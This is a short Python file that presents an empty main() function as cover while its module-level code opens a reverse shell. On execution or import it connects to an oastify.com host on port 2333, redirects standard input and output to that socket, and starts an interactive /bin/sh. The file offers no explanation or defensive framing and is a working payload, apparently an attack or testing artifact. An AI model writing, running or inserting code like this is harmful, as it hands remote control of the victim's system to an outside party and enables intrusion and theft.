#!/usr/bin/python
import socket,subprocess,os,base64,time

def main():
    pass

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("as6fte0lgycesa9xohgt2mi6wx2oqhe6.oastify.com",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);